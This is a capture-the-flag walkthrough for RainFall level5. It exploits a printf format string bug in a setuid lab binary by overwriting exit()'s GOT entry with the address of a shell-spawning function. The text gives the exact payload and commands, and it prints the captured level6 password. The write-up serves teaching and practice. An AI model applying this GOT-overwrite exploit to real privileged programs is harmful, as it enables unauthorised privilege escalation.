# 🔑 Level5 Walkthrough

## Step 1: Discovering the binary
When logged in as `level5`, you see:
d
```bash
level5@RainFall:~$ ls -l
-rwsr-s---+ 1 level6 users 52xx Mar  6  2016 level5
```

- The binary runs with **level6’s privileges** (setuid).  
- Running it just echoes back input:

```bash
./level5
hello
hello
```

So it looks harmless at first glance.

---

## Step 2: Looking at the source
From `source.c`:

```c
void o(char *print) {
    system("/bin/sh");
    _exit(1);
}

void n() {
    char buff[520];
    fgets(buff, 512, stdin);
    printf(buff);   // vulnerable
    exit(1);
}
```

Key points:
- Input is read with `fgets()` (safe against buffer overflow).  
- But then `printf(buff)` is called **without a format string** → **format string vulnerability**.  
- There’s a hidden function `o()` that spawns a shell.  
- The program always calls `exit()` at the end of `n()`.  

So our goal: **redirect `exit()` to `o()`**.

---

## Step 3: Strategy
- The program calls `exit()` before finishing.  
- In ELF binaries, function calls to libc go through the **GOT (Global Offset Table)**.  
- If we overwrite the GOT entry for `exit()` with the address of `o()`, then when the program calls `exit()`, it will actually jump to `o()` and spawn a shell.  

This is a classic **GOT overwrite via format string**.

---

## Step 4: Finding addresses
- GOT entry for `exit()`:

```bash
objdump -R level5 | grep exit
08049838 R_386_JUMP_SLOT   exit
```

So `exit()` is at `0x08049838`.

- Address of `o()`:

```gdb
(gdb) info functions o
0x080484a4  o
```

So `o()` is at `0x080484a4`.

---

## Step 5: Locating our input on the stack
We test with:

```bash
python -c 'print "AAAA " + " %x"*10' | ./level5
```

Output shows `41414141` (our `AAAA`) at the **4th position**.  
So our input is the 4th argument to `printf`.

---

## Step 6: Crafting the exploit
We want to:
1. Place the GOT address of `exit()` (`0x08049838`) at the start of our input.  
2. Print enough characters so that the total printed count equals the address of `o()` (`0x080484a4`).  
3. Use `%n` to write that value into the GOT entry.  

Payload structure:
- `\x38\x98\x04\x08` (address of `exit()` in little endian)
- Padding: `%134513824d` (because `0x080484a4 = 134513828`, minus 4 bytes already printed = 134513824)
        You think:   "write 134513828 decimal"
                      ↕  same thing
        Memory sees: a4 84 04 08  (raw bytes)
                      ↕  same thing
        CPU sees:    0x080484a4   (address of o())
                      ↕
        CPU jumps to o() → shell!
- `%4$n` → write the count into the 4th argument (our address).  

Exploit:

```bash
python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/exploit2
cat /tmp/exploit2 - | ./level5
```

---

## Step 7: Exploiting
Running the payload:

```
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

We now have the password for **level6**.

---

# ✅ Summary
- Vulnerability: **format string bug** in `printf(buff)`.  
- Goal: redirect `exit()` to `o()`.  
- GOT entry for `exit()`: `0x08049838`.  
- Address of `o()`: `0x080484a4`.  
- Input position: 4th argument.  
- Exploit: `"\x38\x98\x04\x08" + "%134513824d%4$n"`.  
- Result: program calls `o()` instead of `exit()`, spawning a shell as **level6**.  
